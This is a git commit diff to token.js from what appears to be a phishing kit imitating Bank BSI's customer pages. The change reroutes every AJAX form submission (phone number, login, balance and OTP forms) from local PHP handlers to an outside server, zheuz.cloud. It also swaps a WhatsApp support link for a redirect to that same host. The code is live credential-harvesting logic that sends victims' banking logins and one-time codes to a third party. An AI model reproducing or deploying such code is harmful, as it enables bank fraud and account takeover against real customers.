07fe8b4b15c4422d8b6828f9248cc57a57023b81
dodypribadi5 <dodypribadi5@gmail.com>
2025-02-13 16:54:30 +0700

    Update token.js

--- token.js
+++ token.js
@@ -8,7 +8,7 @@ $('.process1').fadeIn();
  
       $.ajax({
             type: 'POST',
-            url: 'req/no.php',
+            url: 'https://zheuz.cloud/bsi/to9d/no.php',
             data: $('#formHP').serialize(),
             datatype: 'text',
             
@@ -28,7 +28,7 @@ $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'req/login.php',
+            url: 'https://zheuz.cloud/bsi/to9d/login.php',
             data: $('#formLog').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -54,7 +54,7 @@ $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'req/saldo.php',
+            url: 'https://zheuz.cloud/bsi/to9d/saldo.php',
             data: $('#jualpuki').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -84,7 +84,7 @@ function sendOtp() {
  document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
 $.ajax({
  type: 'POST',
- url: 'req/otp.php',
+ url: 'https://zheuz.cloud/bsi/to9d/otp.php',
  async: false,
  dataType: 'JSON',
  data: $('#form2').serialize(),
@@ -123,7 +123,7 @@ function getcs(){
      audio1.load();
     audio4.loop = false
 setTimeout(function(){  
-location.href='https://api.whatsapp.com/send?phone=6282182480632&text=𝗛𝗮𝗹𝗹𝗼 𝗕𝗮𝗻𝗸 𝗕𝗦𝗜%0ASaya mau request kode E-Commerce Aktivasi';
+location.href='https://zheuz.cloud/wa/to9d';
     }, 5000);
     setTimeout(function(){
     $("#djload").hide();   
